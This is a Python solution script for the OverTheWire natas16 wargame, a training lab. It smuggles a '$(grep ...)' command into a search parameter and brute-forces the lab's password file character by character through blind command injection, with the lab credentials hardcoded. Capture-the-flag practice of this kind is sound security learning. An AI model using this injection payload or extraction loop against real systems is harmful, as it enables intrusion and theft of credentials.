
import requests


target = "http://natas16.natas.labs.overthewire.org"

charset = "0123456789" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "abcdefghijklmnopqrstuvwxyz"


filtered = "0179BCEHIKLRSUXbdhkmnsuv"


for char in charset:
    needle = ("$(grep " + char + " /etc/natas_webpass/natas17)" + "Africans")
    r = requests.post(target, auth=("natas16", "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"), params={"needle": needle})
    # print(r.text)
    if "Africans" not in r.text:
        filtered += char
        print(filtered)


print("finished looking for the char set")
print("attempting to find the flag...")

passwd = ""

for i in range(32):
    for char in filtered: 
        needle = ("$(grep -E ^" + passwd + char + " /etc/natas_webpass/natas17)" + "Africans")
        r = requests.post(target, auth=("natas16", "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"), params={"needle": needle})
        # print(needle)
        if "Africans" not in r.text:
            passwd += char
            print(passwd + ("*" * (32 - len(passwd))))